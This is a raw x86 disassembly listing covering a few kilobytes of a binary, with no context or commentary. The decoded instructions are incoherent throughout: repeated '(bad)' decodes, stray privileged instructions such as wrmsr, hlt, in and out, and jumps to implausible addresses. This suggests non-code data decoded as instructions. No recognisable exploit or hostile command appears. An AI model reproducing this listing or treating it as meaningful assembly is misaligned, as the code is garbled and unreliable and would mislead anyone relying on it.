  413a18:	add    ecx,DWORD PTR [ebx+0x508d1c74]
  413a1e:	adc    al,0x8b
  413a20:	jge    0x413a36
  413a22:	mov    edi,DWORD PTR [eax-0x4]
  413a25:	add    edi,DWORD PTR [edi]
  413a27:	or     bh,bh
  413a29:	push   ebp
  413a2a:	push   es
  413a2b:	mov    DWORD PTR [ebp-0x4],ebx
  413a2e:	add    edi,esi
  413a30:	pop    es
  413a31:	add    esi,DWORD PTR [edi-0x48ccf183]
  413a37:	mov    DWORD PTR [esp+esi*8],ecx
  413a3a:	inc    ebp
  413a3b:	pop    ebp
  413a3c:	xor    DWORD PTR [esi-0x4],0x3b
  413a40:	add    edx,DWORD PTR [ecx+edi*1]
  413a43:	push   es
  413a44:	clc    
  413a45:	mov    bh,0xdb
  413a47:	jp     0x413a00
  413a49:	add    cl,BYTE PTR [esi]
  413a4b:	div    DWORD PTR [edi+0x4d8b0c1c]
  413a51:	test   edi,edi
  413a53:	je     0x413a49
  413a55:	mov    eax,ecx
  413a57:	or     BYTE PTR [ebx],al
  413a59:	dec    BYTE PTR [ecx+0x7d3bec7d]
  413a5f:	jbe    0x413ad3
  413a61:	mov    ecx,DWORD PTR [ebx-0x488017f4]
  413a67:	add    ecx,DWORD PTR [esi]
  413a69:	cmp    DWORD PTR [edi+0x45fe0cf8],esi
  413a6f:	add    eax,DWORD PTR [ebx-0x287af783]
  413a75:	je     0x413ac4
  413a77:	mov    DWORD PTR [ecx],edi
  413a79:	mov    esi,eax
  413a7b:	hlt    
  413a7c:	or     BYTE PTR [ecx+0x7dfff4ff],0x5b
  413a83:	jb     0x413a45
  413a85:	jmp    0x413a72
  413a87:	xor    esi,DWORD PTR [ebx]
  413a89:	pop    edi
  413a8a:	pop    esi
  413a8b:	pop    ebx
  413a8c:	ret    
  413a8d:	ret    0x8b
  413a90:	mov    ecx,DWORD PTR [ebx+0x2c008390]
  413a96:	xor    DWORD PTR [ecx],0xc
  413a99:	pushf  
  413a9a:	xor    ecx,DWORD PTR [ecx+0x4539fc56]
  413aa0:	wrmsr  
  413aa2:	test   DWORD PTR [eax+eax*1+0xcfc8b8b],ebx
  413aa9:	dec    ebp
  413aaa:	ret    
  413aab:	mov    edi,DWORD PTR [esi-0x4]
  413aae:	pop    eax
  413aaf:	dec    ebp
  413ab0:	jne    0x413a3d
  413ab2:	xor    edi,esp
  413ab4:	inc    eax
  413ab5:	dec    ebp
  413ab6:	jbe    0x413b0b
  413ab8:	inc    eax
  413ab9:	pop    ebp
  413aba:	add    edx,DWORD PTR [esi+0x8]
  413abd:	push   ebp
  413abe:	dec    eax
  413abf:	push   ecx
  413ac0:	mov    eax,edi
  413ac2:	and    al,0xf0
  413ac4:	jo     0x413ab1
  413ac6:	mov    eax,DWORD PTR [ebx]
  413ac8:	sbb    BYTE PTR [ebp+0x4d],cl
  413acb:	mov    eax,DWORD PTR [ebx]
  413acd:	nop
  413ace:	or     BYTE PTR [eax],al
  413ad0:	jne    0x413b29
  413ad2:	cmp    ebx,DWORD PTR [edi+esi*2-0x3cc76ce]
  413ad9:	xor    edi,edi
  413adb:	add    edi,DWORD PTR [ebp+0x3]
  413ade:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  413ae4:	js     0x413a6a
  413ae6:	jae    0x413aea
  413ae8:	(bad)  
  413aea:	xor    al,0x5d
  413aec:	jmp    0x413a79
  413aee:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  413af5:	fdecstp 
  413af7:	test   BYTE PTR [edi],ah
  413af9:	add    bh,BYTE PTR [ebp+0x0]
  413afc:	add    ebx,DWORD PTR [ebp-0x77]
  413aff:	mov    edi,eax
  413b01:	cmp    al,0x0
  413b04:	adc    dh,BYTE PTR [ebx]
  413b06:	jge    0x413b0b
  413b08:	mov    edi,DWORD PTR [ebx]
  413b0a:	jl     0x413b1b
  413b0c:	clc    
  413b0d:	dec    edi
  413b0e:	jge    0x413b10
  413b10:	mov    eax,DWORD PTR [ebx]
  413b12:	jb     0x413b1c
  413b14:	mov    ecx,DWORD PTR [ebp-0x8]
  413b17:	mov    edi,edi
  413b19:	xor    edx,DWORD PTR [eax]
  413b1b:	add    edi,DWORD PTR [ebx]
  413b1d:	mov    DWORD PTR [ebp-0x10],edi
  413b20:	inc    edi
  413b21:	pop    ebp
  413b22:	jge    0x413b5f
  413b24:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  413b28:	mov    edx,0xc05d87f0
  413b2d:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  413b31:	fimul  WORD PTR [eax]
  413b33:	fist   WORD PTR [ebp+0x1c]
  413b36:	in     al,dx
  413b37:	jne    0x413b25
  413b39:	mov    edi,DWORD PTR [edx-0x7a27a10]
  413b3f:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  413b43:	fdivp  st(0),st
  413b45:	fild   WORD PTR [ebp+0x4510f85c]
  413b4b:	test   BYTE PTR [ebx+0x4d00fc02],cl
  413b51:	inc    ebp
  413b52:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  413b58:	mov    ebp,DWORD PTR [ebx-0x4]
  413b5b:	adc    al,0x8b
  413b5d:	rcl    DWORD PTR [eax],0x48
  413b60:	mov    esi,0x7080803
  413b65:	fiadd  WORD PTR [ebp+0x4d]
  413b68:	(bad)  
  413b69:	mov    edx,DWORD PTR [edx-0x4]
  413b6c:	mov    edx,DWORD PTR [ebp-0x4]
  413b6f:	xor    ebx,DWORD PTR [ebx+0x330103]
  413b75:	mov    DWORD PTR [edi+0x872dc],edi
  413b7b:	xlat   BYTE PTR ds:[ebx]
  413b7c:	into   
  413b7d:	ffreep st(6)
  413b7f:	retf   0x6c7
  413b82:	iret   
  413b83:	dec    ebp
  413b84:	inc    ebp
  413b85:	mov    DWORD PTR [ebx],edi
  413b87:	fmul   QWORD PTR [edi]
  413b89:	dec    ebp
  413b8a:	jnp    0x413bbf
  413b8c:	add    BYTE PTR [ebx],al
  413b8e:	mov    ecx,DWORD PTR [esp+edi*8]
  413b91:	inc    ebp
  413b92:	dec    ebp
  413b93:	lea    esi,[ebx]
  413b95:	add    DWORD PTR [ebx],eax
  413b97:	jb     0x413bd4
  413b99:	add    BYTE PTR [edi],cl
  413b9b:	inc    ebp
  413b9c:	imul   eax,edi,0x858bd800
  413ba2:	cld    
  413ba3:	clc    
  413ba4:	mov    DWORD PTR [ebp+0x0],eax
  413ba7:	inc    DWORD PTR [eax]
  413ba9:	or     al,0xde
  413bab:	sbb    bh,0x1
  413bae:	retf   
  413baf:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  413bb6:	dec    ebp
  413bb7:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  413bbd:	enter  0x12de,0xdf
  413bc1:	inc    ebp
  413bc2:	pop    ebp
  413bc3:	dec    DWORD PTR [ebx-0x257f0ff4]
  413bc9:	add    DWORD PTR [edx],edx
  413bcb:	add    BYTE PTR [ebp+0x50],dl
  413bce:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  413bd4:	xor    ecx,DWORD PTR [eax-0x38c699fd]
  413bda:	or     ah,al
  413bdc:	pop    ss
  413bdd:	cdq    
  413bde:	push   ebp
  413bdf:	clc    
  413be0:	mov    eax,DWORD PTR [ebp-0x4]
  413be3:	xor    edx,edx
  413be5:	add    esi,DWORD PTR [ebx]
  413be7:	cmp    eax,DWORD PTR [ebx]
  413be9:	hlt    
  413bea:	cmp    DWORD PTR [ebx],esp
  413bec:	or     al,BYTE PTR [ebp+0xf]
  413bef:	mov    eax,DWORD PTR [edx]
  413bf1:	loopne 0x413bf3
  413bf3:	(bad)  
  413bf4:	mov    ecx,esi
  413bf6:	cld    
  413bf7:	pushf  
  413bf8:	pop    ebp
  413bf9:	pushf  
  413bfa:	mov    esi,DWORD PTR [edx]
  413bfc:	lock mov eax,eax
  413bff:	adc    BYTE PTR [ebx],al
  413c01:	or     BYTE PTR [ebx+0x4d001001],0xcf
  413c08:	xor    ebp,DWORD PTR [edi+0x50e45189]
  413c0e:	dec    ebp
  413c0f:	mov    ecx,DWORD PTR [ebx-0x31390304]
  413c15:	(bad)  
  413c16:	iret   
  413c17:	inc    ebp
  413c18:	(bad)  
  413c19:	jne    0x413c68
  413c1b:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  413c21:	(bad)  
  413c22:	cmp    ebx,eax
  413c24:	je     0x413bac
  413c26:	add    edi,edi
  413c28:	or     bh,bh
  413c2a:	dec    ebp
  413c2b:	inc    ebp
  413c2c:	mov    esi,DWORD PTR [ebx]
  413c2e:	cld    
  413c2f:	add    ecx,esi
  413c31:	cmp    ecx,DWORD PTR [eax-0xc]
  413c34:	mov    edx,DWORD PTR [edi]
  413c36:	or     BYTE PTR [ebp-0x7c],al
  413c39:	mov    ebx,DWORD PTR [eax+ebp*8-0x7b7639ce]
  413c40:	or     al,0x9c
  413c42:	inc    ebp
  413c43:	xor    bh,BYTE PTR [ecx+ecx*4]
  413c46:	pushf  
  413c47:	call   0x522bd7
  413c4c:	jne    0x413c15
  413c4e:	mov    ebp,esp
  413c50:	fcomp  DWORD PTR [ebx]
  413c52:	add    BYTE PTR [ecx],al
  413c54:	inc    DWORD PTR [ebp-0x75]
  413c57:	(bad)  
  413c58:	cld    
  413c59:	add    al,0xce
  413c5b:	mov    ecx,edi
  413c5d:	cld    
  413c5e:	inc    ebp
  413c5f:	fidivr WORD PTR [ebx]
  413c61:	fbstp  TBYTE PTR [ebp-0x3e]
  413c64:	mov    eax,DWORD PTR [eax]
  413c66:	adc    BYTE PTR [ebx-0x3974038b],cl
  413c6c:	fadd   st,st(7)
  413c6e:	add    BYTE PTR [ebp-0x1],al
  413c71:	mov    ecx,DWORD PTR [esp+edi*8]
  413c74:	inc    ebp
  413c75:	mov    bh,0xc7
  413c78:	loopne 0x413cbf
  413c7a:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  413c80:	sbb    BYTE PTR [ebx],dh
  413c82:	pushf  
  413c83:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  413c89:	mov    eax,edi
  413c8b:	cwde   
  413c8c:	inc    ebp
  413c8d:	inc    ebp
  413c8e:	jne    0x413c1b
  413c90:	mov    esp,esp
  413c92:	clc    
  413c93:	add    al,0x4d
  413c95:	mov    DWORD PTR [ebx],esi
  413c97:	or     al,0x33
  413c99:	inc    ebp
  413c9a:	lea    ecx,[ebx-0x398d13fd]
  413ca0:	add    bh,al
  413ca2:	inc    ebp
  413ca3:	ror    DWORD PTR [ebx+0x45d829],0x8b
  413caa:	add    ebp,esp
  413cac:	shufps xmm1,xmm3,0xc7
  413cb0:	(bad)  
  413cb1:	jmp    0x748677da
  413cb6:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  413cbc:	hlt    
  413cbd:	mov    ecx,DWORD PTR [edi]
  413cbf:	fadd   DWORD PTR [ebp+0x0]
  413cc2:	xor    ecx,DWORD PTR [edi]
  413cc4:	add    ecx,ecx
  413cc6:	cmp    edi,edi
  413cc8:	pmuludq mm7,QWORD PTR [edx+0x50]
  413ccc:	(bad)  
  413ccd:	jmp    0x413c5a
  413ccf:	mov    edi,esp
  413cd1:	or     al,0xc6
  413cd3:	inc    ebp
  413cd4:	(bad)  
  413cd5:	mov    eax,DWORD PTR [ebp+0x10]
  413cd8:	jne    0x413c63
  413cda:	mov    eax,DWORD PTR [ecx]
  413cdc:	clc    
  413cdd:	add    BYTE PTR [ebp-0x40],cl
  413ce0:	xor    edx,DWORD PTR [eax-0x73]
  413ce3:	jne    0x413ce6
  413ce5:	push   DWORD PTR [edx+0x8]
  413ce8:	add    BYTE PTR [ebp+0x45],al
  413ceb:	mov    ebp,ecx
  413ced:	cld    
  413cee:	add    BYTE PTR [ebp+0x0],cl
  413cf1:	xor    eax,DWORD PTR [ebp+0x3]
  413cf4:	mov    DWORD PTR [ebx],edi
  413cf6:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  413cfc:	sub    eax,0x5d330e4d
  413d01:	lea    esi,[ebx]
  413d03:	add    DWORD PTR [ebx],eax
  413d05:	jb     0x413cf0
  413d07:	add    BYTE PTR [eax],al
  413d09:	inc    ebp
  413d0a:	add    bl,ch
  413d0c:	inc    ebp
  413d0d:	mov    esi,DWORD PTR [ebx]
  413d0f:	or     al,0x3
  413d11:	(bad)  
  413d12:	mov    edi,eax
  413d14:	in     al,dx
  413d15:	scas   eax,DWORD PTR es:[edi]
  413d16:	inc    ebp
  413d17:	mov    esi,DWORD PTR [ebx]
  413d19:	in     al,0x3
  413d1b:	add    al,0x89
  413d1d:	mov    ecx,DWORD PTR [eax+edi*8]
  413d20:	dec    ebp
  413d21:	(bad)  
  413d22:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3164]
  413d29:	mov    ecx,eax
  413d2b:	cld    
  413d2c:	push   es
  413d2d:	dec    ebp
  413d2e:	add    al,0x33
  413d30:	mov    DWORD PTR [ebx],eax
  413d32:	in     al,dx
  413d33:	cmp    DWORD PTR [ebp-0x67],eax
  413d36:	mov    eax,DWORD PTR [ebp-0xba0068]
  413d3c:	mov    edx,DWORD PTR [ebp-0x4]
  413d3f:	mov    ecx,DWORD PTR [ebp-0x18]
  413d42:	xor    ecx,DWORD PTR [ebp+0x3]
  413d45:	cmp    DWORD PTR [ebx],0x8b32749b
  413d4b:	xor    edi,esp
  413d4d:	jmp    0xff753a9f
  413d52:	add    ecx,DWORD PTR [ebp-0x3f]
  413d55:	xor    ebx,DWORD PTR [edi]
  413d57:	add    eax,ecx
  413d59:	cmp    ebx,DWORD PTR [eax]
  413d5b:	mov    ecx,DWORD PTR [ebp-0x4]
  413d5e:	mov    ecx,DWORD PTR [eax]
  413d60:	adc    BYTE PTR [ebp-0x80],al
  413d63:	jmp    0x413d66
  413d65:	mov    eax,DWORD PTR [eax]
  413d67:	cld    
  413d68:	mov    bh,0xc6
  413d6a:	push   ecx
  413d6b:	(bad)  
  413d6c:	jne    0x413dcc
  413d6e:	dec    ecx
  413d70:	or     BYTE PTR [ecx+ebx*1],cl
  413d73:	push   ebp
  413d74:	inc    ebp
  413d75:	in     al,dx
  413d76:	add    ebp,esp
  413d78:	or     bh,al
  413d7a:	dec    ebp
  413d7b:	cld    
  413d7c:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  413d82:	xor    DWORD PTR [eax],0x2
  413d85:	pushf  
  413d86:	dec    DWORD PTR [ebx+0x45510cf4]
  413d8c:	mov    DWORD PTR [ebx+0x5545fc0c],ecx
  413d92:	mov    edx,DWORD PTR [ecx+0xc]
  413d95:	xor    eax,esi
  413d97:	mov    edx,0xc172c7
  413d9c:	inc    ebp
  413d9d:	mov    esi,DWORD PTR [ebp+0x8]
  413da0:	mov    eax,edx
  413da2:	call   0x84c60497
  413da7:	add    DWORD PTR [eax+eax*1-0x7476bace],ebx
  413dae:	call   0x4db14dbb
  413db3:	push   edi
  413db4:	xor    esi,DWORD PTR [ebp+0x3]
  413db7:	(bad)  
  413db8:	pmulhuw mm0,mm1
  413dbb:	test   DWORD PTR [ebp-0x8],ecx
  413dbe:	mov    DWORD PTR [ebp-0x67],eax
  413dc1:	mov    eax,DWORD PTR [ebp-0x4]
  413dc4:	xor    edi,DWORD PTR [ebp-0x73]
  413dc7:	xor    eax,DWORD PTR [ebx]
  413dc9:	xor    esi,DWORD PTR [edx+0x3]
  413dcc:	add    BYTE PTR [ecx],bh
  413dce:	inc    ebp
  413dcf:	(bad)  
  413dd0:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  413dd6:	mov    DWORD PTR [eax],0x750f0004
  413ddc:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  413de2:	lock add BYTE PTR [ebp+0x0],al
  413de6:	mov    esi,DWORD PTR [ebp-0x2c]
  413de9:	mov    ebp,edx
  413deb:	or     al,0x72
  413ded:	ja     0x413def
  413def:	mov    edx,esi
  413df1:	cld    
  413df2:	(bad)  
  413df5:	cli    
  413df6:	mov    esi,DWORD PTR [ebp-0x4]
  413df9:	cmp    ecx,esi
  413dfb:	bswap  edi
  413dfd:	(bad)
  413e01:	mov    esi,DWORD PTR [ebp-0x4]
  413e04:	mov    esi,ecx
  413e06:	clc    
  413e07:	repnz add esi,DWORD PTR [ebp+0x45]
  413e0b:	push   ebx
  413e0c:	xor    eax,DWORD PTR [ebp+0x3]
  413e0f:	xor    bl,BYTE PTR [edi-0x64]
  413e12:	pop    ebx
  413e13:	jmp    0x413eda
  413e18:	mov    esi,DWORD PTR [ebp-0x7d]
  413e1b:	xor    ebp,DWORD PTR [eax]
  413e1d:	lea    eax,[ebp-0x8]
  413e20:	xor    edx,esi
  413e22:	pushf  
  413e23:	out    dx,eax
  413e24:	(bad)  
  413e25:	neg    eax
  413e27:	ins    DWORD PTR es:[edi],dx
  413e28:	test   esi,edi
  413e2a:	clc    
  413e2b:	pop    esp
  413e2c:	inc    ebp
  413e2d:	or     BYTE PTR [ecx+0x450f0c7d],cl
  413e33:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  413e39:	add    cl,al
  413e3b:	jne    0x413dd9
  413e3d:	mov    esi,DWORD PTR [edx]
  413e3f:	in     al,dx
  413e40:	push   esi
  413e41:	xor    BYTE PTR [ebp-0xe],dh
  413e44:	add    edi,esi
  413e46:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  413e4c:	add    cl,bh
  413e4e:	mov    edi,DWORD PTR [ebp+0x8]
  413e51:	mov    DWORD PTR [ebp-0x14],esi
  413e54:	add    esi,DWORD PTR [ebp+0x3c]
  413e57:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  413e5d:	mov    ah,0x3c
  413e5f:	pushf  
  413e60:	pushf  
  413e61:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  413e67:	jne    0x413df4
  413e69:	mov    ecx,DWORD PTR [esp+ebp*8]
  413e6c:	icebp  
  413e6d:	icebp  
  413e6e:	shl    edx,0xf2
  413e71:	(bad)  
  413e72:	mov    ah,0x16
  413e74:	pop    eax
  413e75:	jne    0x413e0a
  413e77:	mov    ecx,DWORD PTR [edi]
  413e79:	in     al,dx
  413e7a:	jmp    0x413e6d
  413e7c:	add    dl,dh
  413e7e:	mov    edi,esi
  413e80:	or     al,0x8
  413e82:	inc    ebp
  413e83:	jne    0x413e88
  413e85:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  413e8b:	ret    
  413e8c:	or     bh,bh
  413e8e:	jge    0x413e78
  413e90:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  413e96:	xor    edi,eax
  413e98:	add    esi,DWORD PTR [ebp-0x77]
  413e9b:	mov    ebx,esp
  413e9d:	clc    
  413e9e:	neg    DWORD PTR [ebp-0x7c]
  413ea1:	xor    eax,DWORD PTR [eax]
  413ea3:	cmp    eax,DWORD PTR [eax]
  413ea5:	repz jne 0x413e3d
  413ea8:	xor    eax,DWORD PTR [ecx]
  413eaa:	add    ebx,DWORD PTR [eax]
  413eac:	mov    DWORD PTR [ebp-0x8],eax
  413eaf:	mov    eax,edi
  413eb1:	cld    
  413eb2:	lock pop eax
  413eb4:	test   DWORD PTR [ebx],esi
  413eb6:	clc    
  413eb7:	add    edx,DWORD PTR [edi-0x740bff77]
  413ebd:	fdivp  st(4),st
  413ebf:	test   ecx,esi
  413ec1:	(bad)  
  413ec2:	jnp    0x413ec3
  413ec4:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  413eca:	jae    0x413e57
  413ecc:	sub    edi,esp
  413ece:	(bad)  
  413ecf:	shl    DWORD PTR [eax-0x3e],0x89
  413ed3:	leave  
  413ed4:	call   0x8196f5e1
  413ed9:	in     al,dx
  413eda:	(bad)  
  413edb:	in     al,dx
  413edc:	add    bh,al
  413ede:	mov    esp,edi
  413ee0:	in     al,dx
  413ee1:	test   DWORD PTR [ebp-0x8],edi
  413ee4:	mov    eax,DWORD PTR [ebp+0x2b]
  413ee7:	xor    BYTE PTR [ebx],al
  413ee9:	pushf  
  413eea:	jnp    0x57303b23
  413ef0:	xor    edx,DWORD PTR [ebp-0x77]
  413ef3:	push   ecx
  413ef4:	loopne 0x413f29
  413ef6:	jne    0x413eb3
  413ef8:	mov    esi,DWORD PTR [edx-0x20]
  413efb:	add    BYTE PTR [ebp-0x3d],bh
  413efe:	xor    eax,DWORD PTR [ebp-0x73]
  413f01:	mov    edi,DWORD PTR [esi]
  413f03:	cld    
  413f04:	jb     0x413ecc
  413f06:	add    bl,al
  413f08:	jne    0x413f4f
  413f0a:	mov    edx,DWORD PTR [edi-0x10]
  413f0d:	jge    0x413f8c
  413f0f:	mov    esi,DWORD PTR [ebx]
  413f11:	lock add ecx,DWORD PTR [ebp+0x3b]
  413f15:	xor    esi,DWORD PTR [ebp-0x77]
  413f18:	mov    esi,eax
  413f1a:	lock inc ebp
  413f1c:	jge    0x413f4f
  413f1e:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  413f25:	dec    ebp
  413f26:	mov    esi,DWORD PTR [ebx]
  413f28:	loopne 0x413eb3
  413f2a:	jge    0x413f24
  413f2c:	add    DWORD PTR [ebp-0x7d],eax
  413f2f:	icebp  
  413f30:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  413f37:	dec    ebp
  413f38:	hlt    
  413f39:	xor    ebx,DWORD PTR [ebp-0x77]
  413f3c:	mov    esi,esp
  413f3e:	in     al,0x45
  413f40:	jge    0x413f7f
  413f42:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  413f49:	dec    ebp
  413f4a:	pop    esp
  413f4b:	xor    edx,DWORD PTR [ebx+0x3ec7389]
  413f51:	inc    ebp
  413f52:	hlt    
  413f53:	xor    DWORD PTR [ebp-0x61],esi
  413f56:	mov    edi,DWORD PTR [eax+0xf19504]
  413f5c:	repnz mov DWORD PTR [ebp+0x20],ebx
  413f60:	cmp    eax,DWORD PTR [ebp+0xf]
  413f63:	test   DWORD PTR [edi+ecx*1-0x1],edx
  413f67:	fistp  WORD PTR [ebx+0x0]
  413f6a:	inc    ebp
  413f6b:	mov    ebx,DWORD PTR [edi+0xc]
  413f6e:	add    eax,eax
  413f70:	inc    ebp
  413f71:	test   BYTE PTR [ebx],dh
  413f73:	add    eax,DWORD PTR [ebx]
  413f75:	add    BYTE PTR [esi+0x45],bl
  413f78:	ret    0x85
  413f7b:	jnp    0x5441c34a
  413f81:	inc    bp
  413f83:	inc    ebp
  413f84:	xor    DWORD PTR [ecx+0xc78a9c],edi
  413f8a:	fdiv   QWORD PTR [ebx]
  413f8c:	test   DWORD PTR [ecx+0x453bf8],edi
  413f92:	push   ebx
  413f93:	add    edi,DWORD PTR [esi+0x708088b]
  413f99:	cmp    esi,eax
  413f9b:	setl   BYTE PTR [ecx-0x74fcffce]
  413fa2:	mov    esp,edi
  413fa4:	call   0x33cc84f6
  413fa9:	or     BYTE PTR [ebx],al
  413fab:	inc    ecx
  413fac:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  413fb2:	and    BYTE PTR [ebp-0x7074f0bb],al
  413fb8:	lock add cl,al
  413fbb:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  413fc2:	mov    ch,0x45
  413fc4:	clc    
  413fc5:	xor    eax,DWORD PTR [ebp+0x3]
  413fc8:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  413fce:	inc    ebp
  413fcf:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  413fd5:	mov    edi,eax
  413fd7:	mov    eax,DWORD PTR [ebp+0x3c]
  413fda:	mov    ecx,DWORD PTR [eax]
  413fdc:	hlt    
  413fdd:	inc    ebp
  413fde:	ror    DWORD PTR [ebx+0x818c45],0xf4
  413fe5:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  413feb:	push   ebp
  413fec:	mov    edi,DWORD PTR [ebx]
  413fee:	in     al,dx
  413fef:	jne    0x413fb2
  413ff1:	mov    eax,DWORD PTR [ebp-0x28]
  413ff4:	add    DWORD PTR [eax],0xe8058dec
  413ffa:	clc    
  413ffb:	mov    esi,DWORD PTR [edi-0x8]
  413ffe:	add    dh,dl
  414000:	rol    WORD PTR [ebp-0x1],cl
  414004:	mov    edx,DWORD PTR [eax+0x8]
  414007:	jne    0x413fc9
  414009:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  414010:	inc    ebp
  414011:	push   esp
  414012:	test   DWORD PTR [ecx+0xf],ecx
  414015:	sub    edx,esp
  414017:	add    eax,DWORD PTR [eax]
  414019:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  41401f:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  414026:	mov    eax,DWORD PTR [ecx]
  414028:	and    BYTE PTR [eax],al
  41402a:	adc    BYTE PTR ds:[eax],al
  41402d:	inc    ebp
  41402e:	inc    cx
  414031:	push   esp
  414032:	add    al,0x75
  414034:	add    BYTE PTR [edx+0x66],dl
  414037:	enter  0xc1,0x4d
  41403b:	mov    esp,DWORD PTR [esi+0x20]
  41403e:	add    DWORD PTR [ecx-0x7b],eax
  414041:	add    eax,DWORD PTR [ebx]
  414043:	str    WORD PTR [eax+0x45]
  414047:	lea    ecx,[ebx+0x45890801]
  41404d:	sbb    BYTE PTR [ebx],al
  41404f:	dec    ebp
  414050:	cmp    al,0xf
  414052:	inc    ebp
  414053:	push   eax
  414054:	mov    esi,DWORD PTR [ebx]
  414056:	push   eax
  414057:	add    eax,eax
  414059:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  414060:	inc    ebp
  414061:	add    BYTE PTR [ecx],dh
  414063:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  41406a:	(bad)  
  41406b:	mov    ebx,eax
  41406d:	loopne 0x4140b4
  41406f:	dec    ebp
  414070:	mov    ecx,DWORD PTR [edi]
  414072:	cld    
  414073:	push   eax
  414074:	xchg   DWORD PTR [ebx],esi
  414076:	add    DWORD PTR [ebx],ebp
  414078:	add    BYTE PTR [ebx],ch
  41407a:	or     BYTE PTR [ecx],bh
  41407c:	dec    ecx
  41407d:	loopne 0x414082
  41407f:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  414085:	push   ebp
  414086:	add    DWORD PTR [ebx+0x55100800],eax
  41408c:	dec    ebp
  41408d:	jmp    0x414018
  41408f:	mov    esp,DWORD PTR [eax]
  414091:	sbb    dl,dl
  414093:	inc    eax
  414094:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  41409a:	add    BYTE PTR [ebx+0x74528555],cl
  4140a0:	push   ebp
  4140a1:	div    DWORD PTR [ebx]
  4140a3:	and    eax,DWORD PTR [ebx]
  4140a5:	add    edx,DWORD PTR [edx-0x30]
  4140a8:	jno    0x414035
  4140aa:	inc    DWORD PTR [eax+eiz*1]
  4140ad:	inc    ebp
  4140ae:	push   eax
  4140af:	push   eax
  4140b0:	mov    esp,DWORD PTR [edi-0x74beff1c]
  4140b6:	mov    edi,esp
  4140b8:	push   eax
  4140b9:	inc    ebp
  4140ba:	enter  0x458b,0x8
  4140be:	push   ecx
  4140bf:	(bad)  
  4140c0:	call   0x10b4a98
  4140c5:	pop    ss
  4140c6:	push   ebp
  4140c7:	mov    ecx,DWORD PTR [ebx+0x489408]
  4140cd:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4140d3:	push   ecx
  4140d4:	jo     0x4140be
  4140d6:	inc    DWORD PTR [edi]
  4140d8:	or     BYTE PTR [eax],al
  4140da:	call   0xcc4824
  4140df:	fmul   QWORD PTR [ebp+0x55]
  4140e2:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4140e8:	mov    bh,0x8c
  4140ea:	adc    al,0x9c
  4140ec:	dec    esp
  4140ed:	xor    bl,BYTE PTR [eax]
  4140ef:	mov    ecx,DWORD PTR [ebp+0xc]
  4140f2:	mov    eax,DWORD PTR [ebp-0x4]
  4140f5:	mov    esi,DWORD PTR [edi-0x3148f924]
  4140fb:	push   es
  4140fc:	retf   
  4140fd:	mov    BYTE PTR [ebp-0x30],0x3b
  414101:	inc    ebp
  414102:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  414109:	retf   0x83fc
  41410c:	into   
  41410d:	dec    ebp
  41410e:	retf   
  41410f:	mov    ecx,DWORD PTR [ebp-0x74]
  414112:	mov    eax,DWORD PTR [eax]
  414114:	fdiv   QWORD PTR [ebx]
  414116:	mov    bh,0x3
  414118:	push   es
  414119:	mov    esi,ecx
  41411b:	sbb    cl,dl
  41411d:	dec    ebp
  41411e:	sar    DWORD PTR [ebx],cl
  414120:	push   ebp
  414121:	jne    0x414132
  414123:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  414129:	lea    ebx,[eax]
  41412b:	call   0xf4caccf2
  414130:	sbb    dh,dl
  414132:	add    edx,ebx
  414134:	push   ebp
  414135:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  41413b:	push   ecx
  41413c:	mov    DWORD PTR [eax-0x30],edx
  41413f:	test   DWORD PTR [edx],eax
  414141:	xadd   esp,esi
  414144:	pop    es
  414145:	add    cl,dl
  414147:	mov    eax,ecx
  414149:	or     al,0x45
  41414b:	(bad)  
  41414c:	push   eax
  41414d:	add    DWORD PTR [edx+0x0],eax
  414150:	add    ecx,DWORD PTR [ecx]
  414152:	and    dh,cl
  414154:	call   0xc54a24
  414159:	add    DWORD PTR [ebp+0x0],edx
  41415c:	mov    esp,DWORD PTR [ebp+0x18]
  41415f:	add    BYTE PTR [eax+0x54],cl
  414162:	xor    eax,DWORD PTR [eax]
  414164:	add    esp,DWORD PTR [esi+0x3b]
  414167:	inc    ebp
  414168:	je     0x4140ed
  41416a:	push   ecx
  41416b:	cli    
  41416c:	dec    ebp
  41416d:	mov    DWORD PTR [ebx],eax
  41416f:	(bad)  
